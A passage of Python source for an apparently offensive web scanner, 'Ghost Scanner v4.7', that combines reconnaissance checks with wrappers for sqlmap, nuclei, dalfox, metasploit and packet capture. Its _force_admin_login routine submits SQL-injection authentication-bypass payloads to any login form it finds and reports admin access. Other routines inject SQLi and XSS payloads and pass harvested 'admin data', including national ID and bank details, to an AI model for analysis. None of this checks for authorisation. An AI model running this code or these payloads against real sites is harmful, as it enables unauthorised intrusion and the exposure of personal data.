        except:pass
        return findings

    def _check_sitemap(self,target):
        findings=[]
        try:
            url=target.rstrip('/')+'/sitemap.xml'
            resp=self._smart_request(url,timeout=8)
            if resp and resp.status_code==200 and ('<urlset' in resp.text or '<sitemapindex' in resp.text):
                findings.append({"type":"Sitemap Found","param":"N/A","payload":"N/A","evidence":"Sitemap.xml accessible","risk":"INFO","confidence":90,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:300],"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        except:pass
        return findings

    def _check_dir_enum(self,target):
        findings=[]
        dirs=["/","/admin","/login","/dashboard","/wp-admin/","/wp-login.php","/phpinfo.php","/api","/uploads","/.git/","/.env","/config"]
        base=target.rstrip('/')
        for d in dirs:
            try:
                url=base+d
                resp=self._smart_request(url,timeout=6)
                if resp and resp.status_code in (200,301,302,401,403):
                    findings.append({"type":f"Dir/File: {d}","param":"N/A","payload":"N/A","evidence":f"Status {resp.status_code}","risk":"MEDIUM" if resp.status_code in (200,401,403) else "INFO","confidence":85,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:200],"statusCode":resp.status_code,"timeDiff":"N/A","verified":self._verify_poc(url,resp.text,3)}})
            except:continue
        return findings

    def _check_sensitive_files(self,target):
        findings=[]
        files=["/.env","/.git/config","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php","/.htaccess","/web.config"]
        base=target.rstrip('/')
        for f in files:
            try:
                url=base+f
                resp=self._smart_request(url,timeout=6)
                if resp and resp.status_code==200 and len(resp.content)>50:
                    findings.append({"type":f"Sensitive File: {f}","param":"N/A","payload":"N/A","evidence":f"Accessible | {len(resp.content)} bytes","risk":"CRITICAL","confidence":95,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:300],"statusCode":resp.status_code,"timeDiff":"N/A","verified":self._verify_poc(url,resp.text,3)}})
            except:continue
        return findings

    def _check_security_headers(self,target):
        findings=[]
        headers=["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options","X-Content-Type-Options","Referrer-Policy","Permissions-Policy"]
        resp=self._smart_request(target,timeout=8)
        if not resp:return findings
        missing=[h for h in headers if h not in resp.headers]
        if missing:
            findings.append({"type":"Missing Security Headers","param":"N/A","payload":"N/A","evidence":f"Missing: {', '.join(missing)}","risk":"LOW","confidence":90,"poc":{"url":target,"curl":f"curl -I \"{target}\"","response":str(resp.headers),"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_waf(self,target):
        findings=[]
        resp=self._smart_request(target,timeout=8)
        if not resp:return findings
        waf_signs=[("Cloudflare",["cf-ray"]),("Akamai",["akamai"]),("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),("Fastly",["fastly"]),("Varnish",["x-varnish"]),("AWS/CloudFront",["x-amz-cf-id"])]
        hlower="\n".join([f"{k.lower()}: {str(v).lower()}" for k,v in resp.headers.items()])
        detected=[]
        for name,keys in waf_signs:
            for k in keys:
                if k.lower() in hlower:detected.append(name);break
        if detected:
            findings.append({"type":"WAF/CDN Detected","param":"N/A","payload":"N/A","evidence":f"Detected: {', '.join(detected)}","risk":"INFO","confidence":95,"poc":{"url":target,"curl":f"curl -I \"{target}\"","response":str(resp.headers),"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_cors(self,target):
        findings=[]
        test_origin="https://evil.example"
        resp=self._smart_request(target,timeout=8,headers={"Origin":test_origin})
        if not resp:return findings
        acao=resp.headers.get("Access-Control-Allow-Origin")
        acac=resp.headers.get("Access-Control-Allow-Credentials")
        if acao=="*":
            findings.append({"type":"CORS Wildcard","param":"N/A","payload":"N/A","evidence":"ACAO: *","risk":"MEDIUM","confidence":90,"poc":{"url":target,"curl":f"curl -H \"Origin: {test_origin}\" \"{target}\"","response":str(resp.headers),"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        if acao==test_origin and acac and acac.lower()=="true":
            findings.append({"type":"CORS Reflect + Credentials","param":"N/A","payload":"N/A","evidence":f"Origin reflected: {acao}","risk":"HIGH","confidence":95,"poc":{"url":target,"curl":f"curl -H \"Origin: {test_origin}\" \"{target}\"","response":str(resp.headers),"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_open_redirect(self,target):
        findings=[]
        p=urlsplit(target);base=urlunsplit((p.scheme,p.netloc,p.path,"",""))
        params=parse_qs(p.query)
        if not params:return findings
        keys=["next","url","return","redirect","dest","goto"]
        for k in params.keys():
            if k.lower() in keys:
                items=[(k,"http://example.com")]
                test_url=base+"?"+urlencode(items)
                resp=self._smart_request(test_url,timeout=6,allow_redirects=False)
                if resp and resp.status_code in (301,302,303,307,308):
                    loc=resp.headers.get("Location","")
                    if loc.startswith("http://example.com"):
                        findings.append({"type":"Open Redirect","param":k,"payload":"http://example.com","evidence":f"Redirect to {loc}","risk":"MEDIUM","confidence":90,"poc":{"url":test_url,"curl":f"curl -k \"{test_url}\"","response":str(resp.headers),"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_ssl_info(self,target):
        findings=[]
        try:
            domain=urlparse(target).netloc.split(':')[0]
            ctx=ssl.create_default_context()
            with socket.create_connection((domain,443),timeout=5) as sock:
                with ctx.wrap_socket(sock,server_hostname=domain) as ssock:
                    cert=ssock.getpeercert()
                    if cert:
                        findings.append({"type":"SSL Certificate Info","param":"N/A","payload":"N/A","evidence":f"Subject: {cert.get('subject')}","risk":"INFO","confidence":100,"poc":{"url":target,"curl":f"openssl s_client -connect {domain}:443","response":str(cert),"statusCode":200,"timeDiff":"N/A","verified":True}})
        except:pass
        return findings

    def _check_cookie_flags(self,target):
        findings=[]
        resp=self._smart_request(target,timeout=8)
        if not resp:return findings
        cookies=resp.headers.get('Set-Cookie','')
        if cookies:
            flags=[]
            if 'Secure' not in cookies:flags.append('Secure')
            if 'HttpOnly' not in cookies:flags.append('HttpOnly')
            if 'SameSite' not in cookies:flags.append('SameSite')
            if flags:
                findings.append({"type":"Insecure Cookie Flags","param":"N/A","payload":"N/A","evidence":f"Missing: {', '.join(flags)}","risk":"MEDIUM","confidence":85,"poc":{"url":target,"curl":f"curl -I \"{target}\"","response":cookies,"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_rate_limit(self,target):
        findings=[]
        success=0
        for i in range(10):
            resp=self._smart_request(target,timeout=4)
            if resp and resp.status_code<400:success+=1
        if success>=8:
            findings.append({"type":"No Rate Limit","param":"N/A","payload":"N/A","evidence":f"{success}/10 succeeded","risk":"MEDIUM","confidence":80,"poc":{"url":target,"curl":f"for i in {{1..10}}; do curl -s \"{target}\"; done","response":f"{success} succeeded","statusCode":200,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_csrf(self,target,forms):
        findings=[]
        for form in forms:
            if form.get('method')=='POST':
                has_token=any(any(x in i['name'].lower() for x in ['csrf','xsrf','token','authenticity']) for i in form.get('inputs',[]))
                if not has_token:
                    findings.append({"type":"CSRF Token Missing","param":"N/A","payload":"N/A","evidence":f"POST form at {form['url']} no CSRF token","risk":"MEDIUM","confidence":85,"poc":{"url":form['url'],"curl":f"curl -X POST \"{form['url']}\"","response":"No CSRF token","statusCode":200,"timeDiff":"N/A","verified":True}})
        return findings

    def _check_wp_activity_log(self,target):
        findings=[]
        try:
            if not target.startswith(('http://','https://')):target='https://'+target
            target=target.rstrip('/')
            wp=self._smart_request(f"{target}/wp-login.php",timeout=8)
            if not wp or 'wp-submit' not in wp.text:
                wp=self._smart_request(f"{target}/wp-admin/",timeout=8)
                if not wp or 'wp-login' not in wp.text.lower():return findings
            readme=self._smart_request(f"{target}/wp-content/plugins/wp-security-audit-log/readme.txt",timeout=5)
            if not readme or 'WP Activity Log' not in readme.text:return findings
            vm=re.search(r"Stable tag:\s*([\d.]+)",readme.text)
            if vm and vm.group(1)<="5.6.3.1":
                findings.append({"type":"WP Activity Log RCE (CVE-2026-54806)","param":"User-Agent","payload":'O:13:"WP_HTML_Token":...',"evidence":f"Vuln: {vm.group(1)}","risk":"CRITICAL","confidence":95,"poc":{"url":f"{target}/wp-login.php","curl":f"curl -X POST ...","response":"Vulnerable","statusCode":200,"timeDiff":"N/A","verified":True},"version":vm.group(1)})
        except:pass
        return findings

    def _force_admin_login(self,forms,base_url,target):
        findings=[]
        for form in forms:
            inputs=form.get('inputs',[])
            has_pass=any('password' in i.get('type','').lower() for i in inputs)
            if not has_pass:continue
            action=form.get('url',base_url)
            method=form.get('method','POST')
            user_field=next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['user','email','login'])),None)
            pass_field=next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['pass','pwd'])),None)
            if not user_field or not pass_field:continue
            Console().print(f"[yellow]Login form at {action} → attempting bypass...[/yellow]")
            bypasses=[("admin' --","anything"),("admin' OR '1'='1' --","anything"),("' OR 1=1 --","' OR 1=1 --"),("admin","admin' OR '1'='1' --")]
            for username,password in bypasses:
                try:
                    resp=self._smart_request(action,timeout=10,method=method,data={user_field:username,pass_field:password})
                    if not resp:continue
                    body=resp.text.lower()
                    if any(x in body for x in ['dashboard','welcome','admin','logout']) or resp.status_code in (301,302):
                        findings.append({"type":"Admin Login Bypass (SQL Injection)","param":user_field,"payload":f"{username} / {password}","evidence":"Successfully logged in as admin","risk":"CRITICAL","confidence":95,"poc":{"url":action,"curl":f"curl -X {method} \"{action}\" -d \"{user_field}={username}&{pass_field}={password}\"","response":resp.text[:500],"statusCode":resp.status_code,"timeDiff":"N/A","verified":self._verify_poc(action,resp.text,3)},"admin_access":True})
                        Console().print(f"[bold red]✓ ADMIN ACCESS GRANTED![/bold red]")
                        return findings
                except:continue
        return findings

    def _check_sql(self,target,param,value,payload):
        try:
            url=build_url(target,param,payload)
            start=time.time()
            resp=self._smart_request(url,timeout=6)
            elapsed=time.time()-start
            if not resp:return None
            poc={"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:300],"statusCode":resp.status_code,"timeDiff":f"{elapsed:.2f}s","verified":self._verify_poc(url,resp.text,3)}
            if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)',resp.text,re.I):
                return {"type":"SQL Injection (Error)","param":param,"payload":payload[:100],"evidence":"DB error","risk":"CRITICAL","confidence":95,"poc":poc}
            if any(x in payload for x in ['SLEEP','WAITFOR']) and elapsed>3:
                return {"type":"SQL Injection (Time)","param":param,"payload":payload[:100],"evidence":f"Delay {elapsed:.1f}s","risk":"CRITICAL","confidence":85,"poc":poc}
        except:pass
        return None

    def _scan_sql(self,target,params):
        results=[]
        all_p=self._generate_sqli_1m()
        final=random.sample(all_p,min(200,len(all_p)))
        total=len(params)*len(final)
        if total==0:return results
        console=Console()
        with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),TimeElapsedColumn(),console=console) as progress:
            task=progress.add_task("[red]SQL Injection (1M payloads)",total=total)
            with ThreadPoolExecutor(max_workers=min(self.threads,30)) as ex:
                futures=[ex.submit(self._check_sql,target,p,v,pl) for p,v in params.items() for pl in final[:5]]
                for f in as_completed(futures):
                    r=f.result()
                    if r:results.append(r)
                    progress.update(task,advance=1)
        return results

    def _check_xss(self,target,param,value,payload,ctx='html'):
        try:
            url=build_url(target,param,payload)
            resp=self._smart_request(url,timeout=6)
            if not resp or payload not in resp.text:return None
            return {"type":f"XSS (Dalfox {ctx})","param":param,"payload":payload[:100],"evidence":f"Reflected in {ctx}","risk":"HIGH","confidence":85,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:300],"statusCode":resp.status_code,"timeDiff":"N/A","verified":self._verify_poc(url,resp.text,3)},"context":[ctx]}
        except:return None

    def _scan_xss_dalfox(self,target,params):
        results=[]
        tasks=[(p,v,pl,ctx) for p,v in params.items() for ctx,pls in self.dalfox_payloads.items() for pl in pls[:5]]
        if not tasks:return results
        console=Console()
        with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),TimeElapsedColumn(),console=console) as progress:
            task=progress.add_task("[cyan]Dalfox XSS",total=len(tasks))
            with ThreadPoolExecutor(max_workers=min(self.threads,30)) as ex:
                futures=[ex.submit(self._check_xss,target,t[0],t[1],t[2],t[3]) for t in tasks]
                for f in as_completed(futures):
                    r=f.result()
                    if r:results.append(r)
                    progress.update(task,advance=1)
        return results

    def _check_dom_xss(self,html,url):
        findings=[]
        for script in re.findall(r'<script[^>]*>(.*?)</script>',html,re.I|re.S):
            for sink in ['document.write','innerHTML','eval','setTimeout','location=']:
                if sink in script:
                    findings.append({"type":"DOM XSS Sink","param":"N/A","payload":sink,"evidence":f"Sink found: {sink}","risk":"HIGH","confidence":60,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":sink,"statusCode":200,"timeDiff":"N/A","verified":True}})
                    break
        return findings

    def _scan_ports(self,domain):
        open_ports=[]
        console=Console()
        with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),TimeElapsedColumn(),console=console) as progress:
            task=progress.add_task("[cyan]Port Scan",total=len(self.common_ports))
            for port in self.common_ports:
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1.5)
                    if s.connect_ex((domain,port))==0:open_ports.append(port)
                    s.close()
                except:pass
                progress.update(task,advance=1)
        return open_ports

    # ---------- EXTERNAL TOOLS (dari v4.6) ----------
    def _check_tool_available(self,tool_name):
        try:
            result=subprocess.run([tool_name,'-h'],capture_output=True,timeout=5,text=True,encoding='utf-8',errors='ignore')
            return result.returncode==0 or 'Usage' in result.stdout or 'usage' in result.stdout.lower()
        except:return False

    def _run_external_tool(self,cmd,timeout=300,cwd=None):
        tool_name=cmd[0] if cmd else 'unknown'
        try:
            result=subprocess.run(cmd,capture_output=True,timeout=timeout,text=True,cwd=cwd,encoding='utf-8',errors='ignore')
            return result.stdout or "" if result.returncode==0 or result.stdout else result.stderr or ""
        except subprocess.TimeoutExpired:return ""
        except FileNotFoundError:return ""
        except Exception:return ""

    def _run_nuclei(self,target):
        findings=[]
        if not self._check_tool_available('nuclei'):return findings
        Console().print("[cyan]🔥 Nuclei...[/cyan]")
        output=self._run_external_tool(['nuclei','-u',target,'-severity','critical,high,medium','-silent','-jsonl','-timeout','10'],timeout=300)
        for line in output.strip().split('\n'):
            if not line.strip():continue
            try:
                data=json.loads(line)
                findings.append({"type":f"Nuclei: {data.get('info',{}).get('name','Unknown')}","param":"N/A","payload":data.get('matched-at','N/A'),"evidence":data.get('info',{}).get('description','Nuclei')[:200],"risk":data.get('info',{}).get('severity','MEDIUM').upper(),"confidence":90,"poc":{"url":data.get('matched-at',target),"curl":data.get('curl-command',f"curl -k \"{target}\""),"response":str(data.get('extracted-results',''))[:300],"statusCode":200,"timeDiff":"N/A","verified":True,"template":data.get('template-id','unknown')}})
            except:continue
        Console().print(f"[green]✓ Nuclei: {len(findings)}[/green]")
        return findings

    def _run_subfinder(self,domain):
        if not self._check_tool_available('subfinder'):return []
        Console().print("[cyan]🔥 Subfinder...[/cyan]")
        output=self._run_external_tool(['subfinder','-d',domain,'-silent'],timeout=120)
        subs=[l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Subfinder: {len(subs)}[/green]")
        return subs

    def _run_httpx(self,targets):
        if not self._check_tool_available('httpx'):return []
        Console().print("[cyan]🔥 httpx...[/cyan]")
        try:
            result=subprocess.run(['httpx','-silent','-status-code','-title','-tech-detect','-json'],input='\n'.join(targets),capture_output=True,timeout=180,text=True,encoding='utf-8',errors='ignore')
            live=[json.loads(l) for l in result.stdout.strip().split('\n') if l.strip()]
        except:live=[]
        Console().print(f"[green]✓ httpx: {len(live)}[/green]")
        return live

    def _run_naabu(self,domain):
        if not self._check_tool_available('naabu'):return []
        Console().print("[cyan]🔥 Naabu...[/cyan]")
        output=self._run_external_tool(['naabu','-host',domain,'-silent','-top-ports','1000','-rate','1000'],timeout=180)
        ports=[l.strip() for l in output.strip().split('\n') if ':' in l]
        Console().print(f"[green]✓ Naabu: {len(ports)}[/green]")
        return ports

    def _run_katana(self,target):
        if not self._check_tool_available('katana'):return []
        Console().print("[cyan]🔥 Katana...[/cyan]")
        output=self._run_external_tool(['katana','-u',target,'-silent','-d','2','-jc','-kf','all'],timeout=180)
        urls=[l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Katana: {len(urls)}[/green]")
        return urls

    def _run_ffuf(self,target):
        findings=[]
        if not self._check_tool_available('ffuf'):return findings
        wordlist=None
        for wl in ['/usr/share/wordlists/dirb/common.txt','/usr/share/seclists/Discovery/Web-Content/common.txt']:
            if os.path.exists(wl):wordlist=wl;break
        if not wordlist:return findings
        Console().print("[cyan]🔥 ffuf...[/cyan]")
        output=self._run_external_tool(['ffuf','-u',target.rstrip('/')+'/FUZZ','-w',wordlist,'-mc','200,301,302,401,403','-s','-t','50'],timeout=180)
        for line in output.strip().split('\n'):
            if line.strip():
                findings.append({"type":"Dir/File Found (ffuf)","param":"N/A","payload":line.strip(),"evidence":f"Found: {line.strip()}","risk":"MEDIUM","confidence":85,"poc":{"url":target.rstrip('/')+'/'+line.strip(),"curl":f"curl -k \"{target.rstrip('/')}/{line.strip()}\"","response":"Accessible","statusCode":200,"timeDiff":"N/A","verified":True}})
        Console().print(f"[green]✓ ffuf: {len(findings)}[/green]")
        return findings

    def _run_sqlmap(self,target):
        findings=[]
        if not self._check_tool_available('sqlmap'):return findings
        if '?' not in target:return findings
        Console().print("[cyan]🔥 sqlmap...[/cyan]")
        output=self._run_external_tool(['sqlmap','-u',target,'--batch','--level','2','--risk','2','--output-dir','/tmp/sqlmap_out','--flush-session'],timeout=300)
        if 'is vulnerable' in output.lower() or 'injectable' in output.lower():
            findings.append({"type":"SQL Injection (sqlmap)","param":"N/A","payload":"sqlmap detected","evidence":output[:500],"risk":"CRITICAL","confidence":95,"poc":{"url":target,"curl":f"sqlmap -u \"{target}\" --batch","response":output[:500],"statusCode":200,"timeDiff":"N/A","verified":True}})
        Console().print(f"[green]✓ sqlmap: {len(findings)}[/green]")
        return findings

    def _run_dalfox(self,target):
        findings=[]
        if not self._check_tool_available('dalfox'):return findings
        Console().print("[cyan]🔥 Dalfox...[/cyan]")
        output=self._run_external_tool(['dalfox','url',target,'--silence','--no-spinner'],timeout=180)
        for line in output.strip().split('\n'):
            if '[V]' in line or '[POC]' in line:
                findings.append({"type":"XSS (Dalfox external)","param":"N/A","payload":line.strip()[:100],"evidence":line.strip()[:200],"risk":"HIGH","confidence":90,"poc":{"url":target,"curl":f"dalfox url \"{target}\"","response":line.strip()[:300],"statusCode":200,"timeDiff":"N/A","verified":True}})
        Console().print(f"[green]✓ Dalfox: {len(findings)}[/green]")
        return findings

    def _run_amass(self,domain):
        if not self._check_tool_available('amass'):return []
        Console().print("[cyan]🔥 Amass...[/cyan]")
        output=self._run_external_tool(['amass','enum','-d',domain,'-silent','-timeout','5'],timeout=300)
        assets=[l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Amass: {len(assets)}[/green]")
        return assets

    def _run_dnsx(self,domain):
        if not self._check_tool_available('dnsx'):return []
        Console().print("[cyan]🔥 dnsx...[/cyan]")
        output=self._run_external_tool(['dnsx','-d',domain,'-a','-resp','-silent'],timeout=60)
        records=[l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ dnsx: {len(records)}[/green]")
        return records

    def _run_gau(self,domain):
        if not self._check_tool_available('gau'):return []
        Console().print("[cyan]🔥 gau...[/cyan]")
        output=self._run_external_tool(['gau',domain,'--threads','5','--timeout','30'],timeout=120)
        urls=[l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ gau: {len(urls)}[/green]")
        return urls

    def _run_waybackurls(self,domain):
        if not self._check_tool_available('waybackurls'):return []
        Console().print("[cyan]🔥 waybackurls...[/cyan]")
        try:
            result=subprocess.run(['waybackurls',domain],capture_output=True,timeout=120,text=True,encoding='utf-8',errors='ignore')
            urls=[l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
        except:urls=[]
        Console().print(f"[green]✓ waybackurls: {len(urls)}[/green]")
        return urls

    def _run_arjun(self,target):
        if not self._check_tool_available('arjun'):return []
        Console().print("[cyan]🔥 Arjun...[/cyan]")
        output=self._run_external_tool(['arjun','-u',target,'--stable','-q'],timeout=180)
        params=[l.strip() for l in output.strip().split('\n') if ':' in l or '=' in l]
        Console().print(f"[green]✓ Arjun: {len(params)}[/green]")
        return params

    def _run_secretfinder(self,js_urls):
        findings=[]
        sf_path=os.path.expanduser("~/SecretFinder/SecretFinder.py")
        if not os.path.exists(sf_path):return findings
        Console().print("[cyan]🔥 SecretFinder...[/cyan]")
        for js_url in js_urls[:20]:
            output=self._run_external_tool(['python3',sf_path,'-i',js_url,'-o','cli'],timeout=60)
            if output and ('apikey' in output.lower() or 'token' in output.lower()):
                findings.append({"type":"Secret in JS","param":"N/A","payload":js_url,"evidence":output[:300],"risk":"HIGH","confidence":80,"poc":{"url":js_url,"curl":f"curl -k \"{js_url}\"","response":output[:300],"statusCode":200,"timeDiff":"N/A","verified":True}})
        Console().print(f"[green]✓ SecretFinder: {len(findings)}[/green]")
        return findings

    def _run_interactsh(self,target):
        findings=[]
        if not self._check_tool_available('interactsh-client'):return findings
        Console().print("[cyan]🔥 Interactsh...[/cyan]")
        try:
            result=subprocess.run(['interactsh-client','-n','1','-v'],capture_output=True,timeout=30,text=True,encoding='utf-8',errors='ignore')
            for line in result.stdout.split('\n'):
                if '.oast.' in line or '.interact.sh' in line:
                    findings.append({"type":"Interactsh OOB Callback","param":"N/A","payload":line.strip(),"evidence":"OOB callback URL","risk":"INFO","confidence":70,"poc":{"url":target,"curl":f"nslookup {line.strip()}","response":line.strip(),"statusCode":200,"timeDiff":"N/A","verified":False}})
        except:pass
        return findings

    def _run_nmap(self,target):
        findings=[]
        if not self._check_tool_available('nmap'):return findings
        Console().print("[cyan]🔥 Nmap...[/cyan]")
        try:
            domain=urlparse(target).netloc.split(':')[0]
            output=self._run_external_tool(['nmap','-sV','-T4','--top-ports','100','-oX','-',domain],timeout=300)
            if output:
                import xml.etree.ElementTree as ET
                xs=output.find('<?xml')
                if xs>=0:
                    try:
                        root=ET.fromstring(output[xs:])
                        for host in root.findall('host'):
                            for port in host.findall('.//port'):
                                port_id=port.get('portid')
                                state=port.find('state')
                                service=port.find('service')
                                if state is not None and state.get('state')=='open':
                                    svc_name=service.get('name','unknown') if service is not None else 'unknown'
                                    svc_product=service.get('product','') if service is not None else ''
                                    svc_version=service.get('version','') if service is not None else ''
                                    findings.append({"type":f"Nmap: Open Port {port_id}","param":"N/A","payload":str(port_id),"evidence":f"Service: {svc_name} {svc_product} {svc_version}".strip(),"risk":"MEDIUM" if port_id in ['22','3306','5432','6379','27017'] else "INFO","confidence":95,"poc":{"url":f"{domain}:{port_id}","curl":f"nmap -sV -p {port_id} {domain}","response":f"{svc_name} {svc_product} {svc_version}".strip(),"statusCode":200,"timeDiff":"N/A","verified":True}})
                    except:pass
        except:pass
        Console().print(f"[green]✓ Nmap: {len(findings)}[/green]")
        return findings

    def _run_metasploit(self,target):
        findings=[]
        if not self._check_tool_available('msfconsole'):return findings
        Console().print("[cyan]🔥 Metasploit...[/cyan]")
        try:
            domain=urlparse(target).netloc.split(':')[0]
            output=self._run_external_tool(['msfconsole','-q','-x',f'search type:exploit platform:multi {domain}; exit'],timeout=180)
            for line in output.split('\n'):
                if 'exploit/' in line and 'multi/' in line:
                    parts=line.split()
                    if len(parts)>=2:
                        module=parts[0];rank=parts[1]
                        findings.append({"type":"Metasploit Module Available","param":"N/A","payload":module,"evidence":f"{module} | Rank: {rank}","risk":"HIGH" if rank in ['excellent','great'] else "MEDIUM","confidence":80,"poc":{"url":target,"curl":f"msfconsole -q -x 'use {module}; show options'","response":line.strip(),"statusCode":200,"timeDiff":"N/A","verified":True}})
                        if len(findings)>=10:break
        except:pass
        return findings

    def _run_wireshark(self,target,duration=10):
        findings=[]
        tshark=None
        for path in ['tshark','C:\\Program Files\\Wireshark\\tshark.exe']:
            if self._check_tool_available(path):tshark=path;break
        if not tshark:return findings
        Console().print("[cyan]🔥 Wireshark (tshark)...[/cyan]")
        try:
            import tempfile
            pcap=os.path.join(tempfile.gettempdir(),f'ghost_{int(time.time())}.pcap')
            domain=urlparse(target).netloc.split(':')[0]
            try:
                cap=subprocess.Popen([tshark,'-i','Wi-Fi','-f',f'host {domain}','-a',f'duration:{duration}','-w',pcap,'-q'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                time.sleep(2);self._smart_request(target,timeout=10);time.sleep(duration-2)
                cap.terminate();time.sleep(1)
            except:pass
            if os.path.exists(pcap):
                out=self._run_external_tool([tshark,'-r',pcap,'-Y','http.request','-T','fields','-e','http.host','-e','http.request.uri'],timeout=60)
                findings.append({"type":"Wireshark Packet Capture","param":"N/A","payload":"N/A","evidence":f"Captured. HTTP requests: {len(out.split(chr(10)))}","risk":"INFO","confidence":100,"poc":{"url":target,"curl":f"tshark -r {pcap} -Y http.request","response":out[:500],"statusCode":200,"timeDiff":f"{duration}s","verified":True,"pcap_file":pcap}})
        except:pass
        return findings

    def _run_burpsuite(self,target):
        findings=[]
        try:
            r=requests.get('http://127.0.0.1:1337/',timeout=3)
            if r.status_code==200 or 'burp' in r.text.lower():
                Console().print("[cyan]🔥 BurpSuite API...[/cyan]")
                scan=requests.post('http://127.0.0.1:1337/v0.1/scan',json={'urls':[target]},timeout=10)
                if scan.status_code==200:
                    sid=scan.json().get('scan_id','unknown')
                    findings.append({"type":"BurpSuite Scan Started","param":"N/A","payload":"N/A","evidence":f"Scan ID: {sid}","risk":"INFO","confidence":100,"poc":{"url":f"http://127.0.0.1:1337/v0.1/scan/{sid}","curl":f"curl -X POST http://127.0.0.1:1337/v0.1/scan","response":f"Scan ID: {sid}","statusCode":200,"timeDiff":"N/A","verified":True}})
        except:pass
        return findings

    # ---------- AI ----------
    def _ai_analysis(self,findings,target,admin_data=None):
        if not self.ai:return ""
        Console().print("[yellow]Running AI analysis (Claude Opus 5)...[/yellow]")
        admin_ctx=f"\n\nADMIN DATA:\n{json.dumps(admin_data,indent=2)[:3000]}" if admin_data else ""
        prompt=f"""Anda adalah Senior Cyber Security Consultant (OSCP, CISSP, CEH, GCIH).
Target: {target}
Category: {self.results_scan.get('domain_category','Unknown')}

FINDINGS:
{json.dumps(findings,indent=2)[:8000]}{admin_ctx}

Berikan analisis dalam format Markdown dengan struktur LENGKAP:

## 1. RINGKASAN EKSEKUTIF
Analisis kondisi keamanan target secara keseluruhan (2-3 paragraf).

## 2. TEMUAN KRITIS & DAMPAK BISNIS
Untuk setiap temuan CRITICAL: jelaskan dampak, skenario eksploitasi nyata, dan potensi kerugian (finansial/reputasi/hukum).

## 3. TEMUAN HIGH & MEDIUM
Kelompokkan dan jelaskan dampaknya.

## 4. ANALISIS DATA SENSITIF (UU PDP / GDPR)
Jika ada data sensitif (NIK, KTP, KK, rekening, dll), jelaskan implikasi hukum & kewajiban notifikasi.

## 5. REKOMENDASI PERBAIKAN (PRIORITAS)
Buat tabel: Prioritas | Temuan | Rekomendasi | Estimasi Effort

## 6. ACTION PLAN 30-60-90 HARI
Langkah konkret jangka pendek, menengah, panjang.

## 7. SARAN PENGUJIAN LANJUTAN
Apa yang perlu di-test lebih dalam (red team, social engineering, physical, dll).

## 8. KRITIK KONSTRUKTIF & BEST PRACTICES
Apa yang bisa lebih baik? Bandingkan dengan standar OWASP/NIST/ISO 27001.
"""
        for attempt in range(3):
            try:
                r=requests.post(f"{AI_BASE_URL}/chat/completions",
                    headers={'Authorization':f'Bearer {AI_API_KEY}','Content-Type':'application/json'},
                    json={"model":AI_MODEL,"messages":[{"role":"user","content":prompt}],"max_tokens":4000},
                    timeout=180)
                if r.status_code==200:return r.json()['choices'][0]['message']['content']
            except Exception as e:
                Console().print(f"[yellow]AI attempt {attempt+1}: {str(e)[:100]}[/yellow]");time.sleep(5)
        return "AI Analysis failed."

    # ---------- PDF ----------
    def _generate_pdf(self,results,output_path="report.pdf"):
        class PDF(FPDF):
            def header(self):
                self.set_font('Arial','B',16)
                self.cell(0,10,'Ghost Scanner v4.7 - Report',ln=True,align='C');self.ln(5)
            def footer(self):
                self.set_y(-15);self.set_font('Arial','I',8)
                self.cell(0,10,f'Page {self.page_no()}',align='C')
        pdf=PDF();pdf.add_page();pdf.set_font('Arial','',11)
        pdf.cell(0,8,f'Target: {results["target"]}',ln=True)
        pdf.cell(0,8,f'Category: {results.get("domain_category","N/A")}',ln=True)
        pdf.cell(0,8,f'Time: {results["timestamp"]}',ln=True)
        pdf.cell(0,8,f'Duration: {results["scan_duration"]:.2f}s',ln=True)
        pdf.ln(3)
        pdf.set_font('Arial','B',13);pdf.cell(0,8,'Summary',ln=True)
        pdf.set_font('Arial','',11);s=results["summary"]
        pdf.cell(0,8,f'Total: {s["total"]} | Critical: {s["critical"]} | High: {s["high"]} | Medium: {s["medium"]} | Low: {s["low"]}',ln=True)
        pdf.ln(3)
        pdf.set_font('Arial','B',13);pdf.cell(0,8,'Vulnerabilities',ln=True)
        pdf.set_font('Arial','',9)
        for vt,vs in results["vulnerabilities"].items():
            if vs:
                pdf.set_font('Arial','B',10);pdf.cell(0,6,f'[{vt}] {len(vs)} finding(s)',ln=True)
                pdf.set_font('Arial','',8)
                for v in vs[:3]:
